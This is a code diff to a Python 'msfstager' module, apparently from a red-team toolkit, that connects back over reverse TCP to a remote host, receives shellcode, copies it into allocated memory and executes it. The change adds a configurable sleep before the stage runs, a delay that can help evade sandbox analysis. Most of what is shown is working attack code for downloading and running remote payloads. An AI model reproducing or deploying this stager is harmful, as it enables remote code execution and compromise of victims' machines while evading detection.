@@ -1,8 +1,9 @@
 import utils.arg
 from utils.helper import nstate as nstate
+from time import sleep
 import ctypes.wintypes
-import sys
-import argparse
+#import sys
+#import argparse
 import socket
 import struct
 import ctypes
@@ -11,15 +12,16 @@ class stager():
     
     Author = 'raptor@0xdeadbeef.info, psycore8'
     Description = 'Connect back (reverse_tcp) to remote host and receive a stage'
-    Version = '0.0.1'
+    Version = '0.0.3'
     payload = any
     sock = any
 
-    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str):
+    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
         self.remote_host = remote_host
         self.remote_port = remote_port
         self.timeout = timeout
         self.architecture = architecture
+        self.sleeptime = sleeptime
 
     def init():
         spName = 'msfstager'
@@ -28,6 +30,7 @@ class stager():
             ['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
             ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
             ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to'],
+            ['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed'],
             ['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
         ]
         utils.arg.CreateSubParserEx(spName, stager.Description, spArgList)
@@ -100,6 +103,10 @@ class stager():
             print(f'{nstate.OKGREEN} Memory allocated!')
             buf = (ctypes.c_char * len(self.payload)).from_buffer(self.payload)
             RtlMoveMemory(ptr, buf, len(self.payload))
+
+        if self.sleeptime > 0:
+            print(f'{nstate.INFO} Let\'s take a nap for {self.sleeptime} seconds')
+            sleep(self.sleeptime)
 
         # execute the shellcode
         ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
